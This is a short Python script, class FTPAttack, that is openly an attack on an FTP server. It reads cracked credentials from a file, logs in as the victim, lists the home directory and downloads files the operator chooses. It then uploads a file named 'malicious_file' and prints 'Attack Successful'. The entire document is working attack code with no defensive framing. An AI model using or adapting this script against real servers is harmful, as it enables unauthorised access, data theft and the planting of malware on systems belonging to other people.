import ftplib
class FTPAttack:
    print("Attacking FTP Server")
    def ftpAttack():
        crackfile = open("cracked_creds.txt", "r")
        crack_creds = crackfile.read()
        crackfile.close()
        print("crackfile: ", crack_creds)
        ftp_host = crack_creds.split(":")[0]
        ftp_port = int(crack_creds.split(":")[1])
        victim_user = crack_creds.split(":")[2]
        victim_pass = crack_creds.split(":")[3]
        ftp_server = ftplib.FTP()
        try:
            print("Connecting to Username: ", victim_user, " Password: ", victim_pass)
            ftp_server.connect(ftp_host, ftp_port, timeout=5)
            ftp_server.login(victim_user, victim_pass)
        except ftplib.error_perm:
            pass
        except TimeoutError:
            pass
        else:
            print("Contents in User's Home Directory:")
            ftp_server.dir()
            while True:
                    filename = input("Enter file to be downloaded: ")
                    with open(filename, "wb") as file:
                        ftp_server.retrbinary(f"RETR {filename}", file.write)
                    
                    cn = input("Download another file? Y/N: ")
                    if cn == 'N':
                        break

            print("Uploading malicious file on FTP server")
            filename = "malicious_file"
            with open(filename, "rb") as file:
                ftp_server.storbinary(f"STOR {filename}", file)
            
            print("File uploaded Successfully. Contents in server directory: ")
            ftp_server.dir()
            print("Closing conncetion with FTP server")
            ftp_server.quit()
    ftpAttack()

print("Attack Successful")
